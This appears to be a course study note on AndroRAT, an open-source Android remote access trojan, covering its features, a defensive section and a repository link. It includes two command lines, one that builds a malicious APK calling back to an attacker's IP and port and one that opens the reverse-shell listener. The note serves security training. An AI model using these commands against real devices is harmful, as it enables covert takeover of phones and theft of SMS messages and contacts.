# AndroRAT

## Overview

AndroRAT (Android Remote Administration Tool) is an open-source Remote Access Trojan (RAT) framework designed for Android devices. It generates malicious APK files that establish reverse connections, allowing remote administration and security assessment of Android platforms during authorized penetration testing.

---

## Key Features

- Generates malicious Android APK files.
- Establishes reverse shell connections.
- Retrieves device information.
- Extracts SMS messages and contacts.
- Collects network and device details.
- Supports remote command execution.

---

## Common Usage

```bash
python3 androRAT.py --build -i <IP> -p <PORT> -o <APK_NAME>

python3 androRAT.py --shell -i 0.0.0.0 -p <PORT>
```

---

## Practical Example

During **Module 17 – Hacking Mobile Platforms**, AndroRAT was used to generate a malicious APK, establish a reverse connection from the target Android device, and retrieve device information and SMS messages to demonstrate how Remote Access Trojans compromise mobile platforms.

---

## Defensive Perspective

Users should install applications only from trusted sources, verify application permissions, enable Google Play Protect, and keep Android devices updated. Mobile security solutions help detect malicious APKs before they compromise the device.

---

## Used In

- Module 17 – Hacking Mobile Platforms

---

## Official Resources

- https://github.com/karma9874/AndroRAT

---